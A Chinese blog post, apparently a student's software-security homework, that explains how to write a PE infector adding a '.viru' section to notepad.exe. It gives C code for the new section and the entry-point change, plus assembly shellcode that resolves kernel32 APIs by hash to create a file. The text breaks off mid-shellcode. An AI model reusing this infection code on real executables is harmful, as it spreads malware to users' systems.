@@ -1,0 +1,1054 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.5.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/icon_180.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png?v=6.5.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png?v=6.5.0">
+
+
+  <link rel="mask-icon" href="/images/logo2.svg?v=6.5.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.5.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: 'WKHA6YLSNH',
+      apiKey: '46dba96b67832c36609d31c01e6772af',
+      indexName: 'blog',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="导语这是我软件安全作业，希望对想要学习PE病毒编写的同学们有所帮助。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PE病毒">
+<meta property="og:url" content="http://such-stupid6.github.io/2020/04/08/PE%E7%97%85%E6%AF%92/index.html">
+<meta property="og:site_name" content="Gμn_">
+<meta property="og:description" content="导语这是我软件安全作业，希望对想要学习PE病毒编写的同学们有所帮助。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-04-08T05:45:59.000Z">
+<meta property="article:modified_time" content="2020-04-08T12:20:43.318Z">
+<meta property="article:author" content="Gμn_">
+<meta property="article:tag" content="恶意代码">
+<meta name="twitter:card" content="summary">
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="Gμn_" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="http://such-stupid6.github.io/2020/04/08/PE病毒/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>PE病毒 | Gμn_</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Gμn_</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">Stay noob, will ya?</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />归档</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://such-stupid6.github.io/2020/04/08/PE%E7%97%85%E6%AF%92/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Gμn_">
+      <meta itemprop="description" content="a noob will become a big guy.">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Gμn_">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PE病毒
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-04-08 13:45:59 / 修改时间：20:20:43" itemprop="dateCreated datePublished" datetime="2020-04-08T13:45:59+08:00">2020-04-08</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>这是我软件安全作业，希望对想要学习PE病毒编写的同学们有所帮助。</p>
+<a id="more"></a>
+
+<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>编写一个PE文件传染程序infect.exe，功能要求如下：</p>
+<ol>
+<li>infect.exe运行后，向同目录下的notepad.exe程序植入“病毒载荷”代码.</li>
+<li>infect.exe不能重复传染notepad.exe.</li>
+<li>notepad.exe被植入“病毒载荷”后，具备如下行为：一旦执行，就会向其所在目录写入一个txt文件，文件名为：学号-姓名.txt，文件内容为空。注意：这里的姓名和学号要改为同学自己的名字和学号。</li>
+</ol>
+<h1 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h1><p>infect.exe的目标是向notepad.exe插入一段病毒载荷，也就是说我们要向一个已知的PE文件插入一段代码，使他能做到我们想要它做到的，但是实际上它并不应该能做到的功能。<br>一般来说PE病毒的载荷插入方式有两种，其一是在节之间插入，其二是新建节插入。<br>在节之间插入的好处是不用改entrypoint，在shellcode里不需要jmp回原本的entrypoint，基本上顺着执行原本的PE文件的过程中就可以将你的shellcode执行了，而缺点也显而易见，节之间的空间可能不足，可能出现无法植入shellcode的情况，而如果要利用多个节之间的空间的话就意味着载荷得分段执行，寄存器堆栈的状态都很可能变化，因此编写shellcode非常困难。<br>而新建节和节之间插入的优缺点刚好相反。相较之下更改entrypoint是比足够简单的，因此我们选择新建节植入shellcode。</p>
+<h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><p>借鉴了网上很多的代码，大部分是使用handle非常便捷的修改了PE头的各个字段，而我由于太菜了加上正好需要具体理解PE格式，所以采用了很简单的文件指针的操作。</p>
+<h2 id="新建节"><a href="#新建节" class="headerlink" title="新建节"></a>新建节</h2><p>由上一篇博客可知，新建节要修改的内容有</p>
+<ol>
+<li>PE头中的fileheader字段（IMAGE_NT_HEADERS.FileHeader的内容)</li>
+<li>PE头中的optionalheader字段(IMAGE_NT_HEADERS.OptionalHeader的内容)</li>
+<li>新节的节首部各个字段（IMAGE_SECTION_HEADER的各个内容）</li>
+</ol>
+<p>需要注意的是，由于我们多加了一个节头，这个接头会覆盖掉原本应该放IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT的位置，不过一般情况下这个地方是被保留的，全为0，因此我们只需将ntheader中指向这里的指针清空即可（也不能叫它指针吧），也就是将OptionalHeader.DataDirectory[11]的virtualaddress和size全清0。如果不清零的话，在装载PE程序的时候会装载器会报错。</p>
+<p>具体代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs plain">IMAGE_SECTION_HEADER addsection(char *file)<br>&#123;<br><br>    IMAGE_DOS_HEADER image_dos_header;<br>    IMAGE_NT_HEADERS image_nt_headers;<br>    IMAGE_SECTION_HEADER image_section_header; &#x2F;&#x2F; 用于存储新加的节表项<br>    IMAGE_SECTION_HEADER old_section;          &#x2F;&#x2F; 存储旧的节表项<br>    int num_section &#x3D; 0;<br>    &#x2F;&#x2F;    byte sec[8]&#x3D;&quot;.txt&quot;;<br><br><br><br>    FILE *h;<br>    h &#x3D; fopen(file, &quot;rb+&quot;);<br>    fseek(h, 0, SEEK_SET);<br>    fread(&amp;image_dos_header, sizeof(IMAGE_DOS_HEADER), 1, h);<br>    fseek(h, image_dos_header.e_lfanew, SEEK_SET);<br>    fread(&amp;image_nt_headers, sizeof(IMAGE_NT_HEADERS), 1, h); &#x2F;&#x2F;PE头<br>    &#x2F;&#x2F;printf(&quot;%d&quot;, sizeof(IMAGE_NT_HEADERS));<br>    &#x2F;&#x2F;for (int a &#x3D; 0; a &lt;&#x3D; 15; a++)<br>    &#x2F;&#x2F;  printf(&quot;%x,%x\n&quot;, image_nt_headers.OptionalHeader.DataDirectory[a].VirtualAddress, image_nt_headers.OptionalHeader.DataDirectory[a].Size);<br><br>    num_section &#x3D; image_nt_headers.FileHeader.NumberOfSections;<br>    fseek(h, image_dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (num_section - 1) * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);&#x2F;&#x2F; 跳到最后一个节表项<br>    fread(&amp;old_section, sizeof(IMAGE_SECTION_HEADER), 1, h);  &#x2F;&#x2F; 存储最后一个节表项到old_section<br><br>    image_nt_headers.FileHeader.NumberOfSections +&#x3D; 1;<br>    image_section_header.Characteristics &#x3D; IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;<br>    image_section_header.Misc.VirtualSize &#x3D; image_nt_headers.OptionalHeader.SectionAlignment;<br>    &#x2F;&#x2F;bool x&#x3D;true;<br>    for (int n &#x3D; 1; true; n++) &#123;<br>        if (image_nt_headers.OptionalHeader.FileAlignment *n &gt; 520) break; <br>        image_section_header.SizeOfRawData &#x3D; image_nt_headers.OptionalHeader.FileAlignment * n;<br>        strcpy((char*)image_section_header.Name, &quot;.viru&quot;);<br>        image_section_header.PointerToRawData &#x3D; alig(old_section.PointerToRawData + old_section.SizeOfRawData, image_nt_headers.OptionalHeader.FileAlignment);<br>        image_section_header.VirtualAddress &#x3D; alig(old_section.VirtualAddress + old_section.SizeOfRawData, image_nt_headers.OptionalHeader.SectionAlignment);<br>        fseek(h, image_dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + num_section * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);<br>        fwrite(&amp;image_section_header, sizeof(IMAGE_SECTION_HEADER), 1, h);<br>    &#125;<br><br>    image_nt_headers.OptionalHeader.SizeOfImage &#x3D; alig(image_section_header.VirtualAddress + image_section_header.SizeOfRawData, image_nt_headers.OptionalHeader.SectionAlignment);<br>    image_nt_headers.OptionalHeader.DataDirectory[11].VirtualAddress &#x3D; 0;<br>    image_nt_headers.OptionalHeader.DataDirectory[11].Size &#x3D; 0;<br>    fseek(h, image_dos_header.e_lfanew, SEEK_SET);<br>    fwrite(&amp;image_nt_headers, sizeof(IMAGE_NT_HEADERS), 1, h);<br><br>    fseek(h, image_section_header.PointerToRawData, SEEK_SET);<br>    byte *s &#x3D; (byte *)malloc(image_section_header.SizeOfRawData);<br>    ZeroMemory((void *)s, image_section_header.SizeOfRawData);<br>    fwrite(s, image_section_header.SizeOfRawData, 1, h);<br><br><br>    fclose(h);<br><br>    return image_section_header;&#x2F;&#x2F; 返回病毒节<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="修改入口点"><a href="#修改入口点" class="headerlink" title="修改入口点"></a>修改入口点</h2><p>只需要将optionalheader中的addressofentrypoint改为新加节的rva即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">DWORD changeentry(DWORD entry,char* target) &#123;<br>    FILE* fp &#x3D; fopen(target, &quot;rb+&quot;);<br>    if (fp &#x3D;&#x3D; NULL) &#123;<br>        &#x2F;&#x2F;printf(&quot;can not open file&quot;);<br>        return 0;<br>    &#125;<br>    &#x2F;&#x2F; 获取dos头<br>    IMAGE_DOS_HEADER dosHeader;<br>    fread(&amp;dosHeader, 1, sizeof(dosHeader), fp);<br>    &#x2F;&#x2F; 获取PE头<br>    DWORD offsetPeHeader &#x3D; dosHeader.e_lfanew;<br>    fseek(fp, offsetPeHeader, SEEK_SET);<br>    IMAGE_NT_HEADERS ntHeader;<br>    fread(&amp;ntHeader, 1, sizeof ntHeader, fp);<br>    fseek(fp, offsetPeHeader, SEEK_SET);<br>    DWORD old_entry;<br>    old_entry &#x3D; ntHeader.OptionalHeader.AddressOfEntryPoint;<br>    ntHeader.OptionalHeader.AddressOfEntryPoint &#x3D; entry;<br>    DWORD offset;<br>    offset &#x3D; entry - old_entry;<br>    fwrite(&amp;ntHeader, sizeof(ntHeader), 1, fp);<br>    fclose(fp);<br>    return offset;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h2><p>shellcode使用汇编写，由于我太菜了汇编能力低下，这里就参考了《0day安全_软件漏洞分析技术(第二版)》的代码。<br>因为我们是要创建一个文件，所以需要用到的函数只有kernel32.dll的CreateFileA函数，由此，我们的shellcode编写的步骤如下。</p>
+<h3 id="获取kernel32-dll基址并读引入表以获得想要的函数"><a href="#获取kernel32-dll基址并读引入表以获得想要的函数" class="headerlink" title="获取kernel32.dll基址并读引入表以获得想要的函数"></a>获取kernel32.dll基址并读引入表以获得想要的函数</h3><p>首先我们需要获得kernel32.dll的位置，所有的win32程序都会加载ntdll.dll和kernel32.dll，进行以下步骤。<br>通过段选择字FS在内存中找到当前的线程环境块TEB<br>TEB偏移0x30的地方存着指向进程环境块PEB的指针<br>PEB偏移位置为0x0C的地方存放着PEB_LDR_DATA的指针，PEB_LDR_DATA结构体中存放着已经被进程装载的动态链接库信息，<br>PEB_LDR_DATA结构体偏移位置为0x1C指向模块初始化链表的头指针InInitializationOrderModuleList<br>InInitializationOrderModuleList中按照顺序存放和PE装入运行时初始化模块的信息，第一个链表结构是ntdll.dll，第二个节点就是kernel32.dll<br>kernel32.dll的节点偏移0x08就是kernel32.dll在内存中的加载基址<br>kernel32.dll的加载基址偏移0x3C就是kernel32.dll的PE头<br>PE头偏移0x78的地方存着指向函数导出表的指针<br>导出表偏移0x1C指向存储导出函数RVA的列表（IAT）<br>导出表偏移0x20指向存储导出函数名的列表（INT）<br>函数的RVA地址和名字按顺序存在这两个表中，我们可以在名称列表中定位到所需的函数的下标，然后在地址表里找到对应的RVA。<br>又由于我们已经得到了动态加载库的加载基址，就获得了所需API在内存中的虚拟地址。</p>
+<h4 id="获取kernel32-dll的基地址"><a href="#获取kernel32-dll的基地址" class="headerlink" title="获取kernel32.dll的基地址"></a>获取kernel32.dll的基地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">mov ebx, fs:[edx + 0x30]    ; ebx &#x3D; address of PEB <br>mov ecx, [ebx + 0x0c]       ; ecx &#x3D; pointer to loader data <br>mov ecx, [ecx + 0x1c]       ; ecx &#x3D; first entry in initialisation order list <br>mov ecx, [ecx]              ; ecx &#x3D; second entry in list (kernel32.dll) <br>mov ebp, [ecx + 0x08]       ; ebp &#x3D; base address of kernel32.dll<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="读取kernel32-dll的引入表"><a href="#读取kernel32-dll的引入表" class="headerlink" title="读取kernel32.dll的引入表"></a>读取kernel32.dll的引入表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">lodsd                       ; load next hash into al and increment esi <br>pushad                      ; preserve registers <br>mov eax, [ebp + 0x3c]       ; eax &#x3D; start of PE header <br>mov ecx, [ebp + eax + 0x78] ; ecx &#x3D; relative offset of export table <br>add ecx, ebp                ; ecx &#x3D; absolute addr of export table <br>mov ebx, [ecx + 0x20]       ; ebx &#x3D; relative offset of names table <br>add ebx, ebp                ; ebx &#x3D; absolute addr of names table <br>xor edi, edi                ; edi will count through the functions<br></code></pre></td></tr></table></figure>
+
+<h3 id="寻找对应的函数"><a href="#寻找对应的函数" class="headerlink" title="寻找对应的函数"></a>寻找对应的函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">inc edi                     ; increment function counter <br>mov esi, [ebx + edi * 4]    ; esi &#x3D; relative offset of current function name <br>add esi, ebp                ; esi &#x3D; absolute addr of current function name <br>cdq                         ; dl will hold hash (we know eax is small)<br>inc edi                     ; increment function counter <br>mov esi, [ebx + edi * 4]    ; esi &#x3D; relative offset of current function name <br>add esi, ebp                ; esi &#x3D; absolute addr of current function name <br>cdq                         ; dl will hold hash (we know eax is small)<br></code></pre></td></tr></table></figure>
+<p>大家可能不理解hash是干啥的，由于我们win32程序使用的寄存器都是32位的，而我们要读取的函数的名称长度不一，所以我们使用哈希的方法来将长的函数名变成一个等长度的串，以便于cmp。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">movsx eax, byte ptr[esi]<br>cmp al,ah<br>jz compare_hash<br>ror edx,7<br>add edx,eax<br>inc esi<br>jmp hash_loop<br></code></pre></td></tr></table></figure>
+<p>而比较hash的函数如下，如果我们没找到的话就再拿下一个函数，让他hash然后再比较，如果找到了的话就去对应的IAT找他的绝对地址，并且将他push到edi栈的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">cmp edx, [esp + 0x1c]       ; compare to the requested hash (saved on stack from pushad) <br>jnz next_function_loop <br>mov ebx, [ecx + 0x24]       ; ebx &#x3D; relative offset of ordinals table <br>add ebx, ebp                ; ebx &#x3D; absolute addr of ordinals table <br>mov di, [ebx + 2 * edi]     ; di &#x3D; ordinal number of matched function <br>mov ebx, [ecx + 0x1c]       ; ebx &#x3D; relative offset of address table <br>add ebx, ebp                ; ebx &#x3D; absolute addr of address table <br>add ebp, [ebx + 4 * edi]    ; add to ebp (base addr of module) the <br>                            ; relative offset of matched function <br>xchg eax, ebp               ; move func addr into eax <br>pop edi                     ; edi is last onto stack in pushad <br>stosd                       ; write function addr to [edi] and increment edi <br>push edi <br>popad                   ; restore registers <br>                        ; loop until we reach end of last hash <br>cmp eax,0x1e380a6a<br>jne find_lib_functions<br></code></pre></td></tr></table></figure>
+<p>直到找完最后一个要找的函数的hash为止。</p>
+<p>然后再最后用edi-几来调用对应的函数。<br>总体代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs plain">int main()<br>&#123;<br>    _asm&#123;<br>        nop;<br>        CLD;<br>        push 0x94e43293                     ;hash of CreateFileA<br>        push 0x4fd18963                     ;hash of ExitProcess<br>        mov esi, esp<br>        lea edi, [esi-0x0c]<br>            <br><br>        xor ebx, ebx<br>        mov bh, 0x04<br>        sub esp, ebx<br><br>        mov bx,0x3233<br>        push ebx<br>        push 0x72657375<br>        push esp<br>        xor edx, edx<br><br>    ; find base addr of kernel32.dll <br>        mov ebx, fs:[edx + 0x30]    ; ebx &#x3D; address of PEB <br>        mov ecx, [ebx + 0x0c]       ; ecx &#x3D; pointer to loader data <br>        mov ecx, [ecx + 0x1c]       ; ecx &#x3D; first entry in initialisation order list <br>        mov ecx, [ecx]              ; ecx &#x3D; second entry in list (kernel32.dll) <br>        mov ebp, [ecx + 0x08]       ; ebp &#x3D; base address of kernel32.dll <br><br>find_functions:<br>        lodsd<br>        pushad<br>        mov eax, [ebp + 0x3c]<br>        mov ecx, [ebp + eax + 0x78] <br>        add ecx, ebp        <br>        mov ebx, [ecx + 0x20]   <br>        add ebx, ebp        <br>        xor edi, edi        <br><br>next_function_loop:<br>        inc edi             <br>        mov esi, [ebx + edi * 4]    <br>        add esi, ebp        <br>        cdq                 <br><br>hash_loop:<br>        movsx eax, byte ptr[esi]    <br>        cmp al, ah          <br>        jz compare_hash     <br>        ror edx, 7          <br>        add edx, eax        <br>        inc esi             <br>        jmp hash_loop       <br><br>compare_hash:<br>        cmp edx, [esp + 0x1c]       <br>        jnz next_function_loop      <br>        mov ebx, [ecx + 0x24]       <br>        add ebx, ebp        <br>        mov di, [ebx +2 * edi]      <br>        mov ebx, [ecx + 0x1c]       <br>        add ebx, ebp        <br>        add ebp, [ebx + 4 * edi]    <br>        xchg eax, ebp       <br>        pop edi             <br>        stosd               <br><br>        push edi            <br>        popad               <br><br>        cmp eax, 0x94e43293 <br>        jne find_functions  <br><br>function_call:<br>        push ebp;<br>        mov ebp,esp;<br>        mov esi,esp<br>        sub esp,18h ;<br>        mov dword ptr [ebp-18h],    ;数据脱敏 ~<br>        mov dword ptr [ebp-14h],     <br>        mov dword ptr [ebp-10h],   <br>        mov dword ptr [ebp-0ch],<br>        mov dword ptr [ebp-08h],   <br>        mov dword ptr [ebp-04h],    <br><br>        xor eax, eax<br>        push eax<br>        mov al, 0x82<br>        push eax<br>        mov al, 0x02<br>        push eax<br>        xor al, al<br>        push eax<br>        push eax<br>        mov al, 0x40<br>        sal eax, 0x18<br>        push eax<br>        lea eax,[ebp-18h] <br>        push eax <br>        